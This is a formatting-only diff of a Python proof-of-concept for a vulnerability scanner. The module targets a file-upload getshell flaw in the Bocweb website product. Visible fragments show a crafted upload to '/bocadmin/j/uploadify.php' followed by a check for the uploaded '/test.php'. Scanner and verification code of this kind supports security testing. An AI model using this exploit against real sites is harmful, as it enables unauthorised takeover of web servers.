@@ -2,13 +2,15 @@
 
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
-import re, urlparse
+import re
+import urlparse
+
 
 class Vuln(ABVuln):
     vuln_id = 'Bocweb_0001'  # 平台漏洞编号，留空
     name = '博采微营销网站前台getshell'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.FILE_UPLOAD # 漏洞类型
+    type = VulnType.FILE_UPLOAD  # 漏洞类型
     disclosure_date = '2015-07-09'  # 漏洞公布时间
     desc = '''
         Bocweb（博采网络）是杭州博采网络科技股份有限公司的高端网站建设品牌，是知名的杭州网络公司。
@@ -23,6 +25,7 @@ class Vuln(ABVuln):
     product = 'Bocweb'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
 
+
 class Poc(ABPoc):
     poc_id = '62949694-75a4-4e8a-8088-f0e8e67efe81'
     author = '47bwy'  # POC编写者
@@ -36,7 +39,7 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
 
-            #__Refer___ = http://www.wooyun.org/bugs/wooyun-2010-0124987
+            # __Refer___ = http://www.wooyun.org/bugs/wooyun-2010-0124987
             hh = hackhttp.hackhttp()
             arg = self.target
             p = urlparse.urlparse(arg)
@@ -69,7 +72,8 @@ Content-Disposition: form-data; name="submit"
 Submit
 -----------------------------32382156818478--
             """
-            code, head, res, errcode, _ = hh.http(arg + '/bocadmin/j/uploadify.php', raw=raw.format(scheme=p.scheme, netloc=p.netloc));
+            code, head, res, errcode, _ = hh.http(
+                arg + '/bocadmin/j/uploadify.php', raw=raw.format(scheme=p.scheme, netloc=p.netloc))
             if code == 200 and res:
                 n_url = 'http://%s/test.php' % (p.netloc)
                 code, head, res, errcode, _ = hh.http(n_url)
@@ -83,6 +87,7 @@ Submit
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
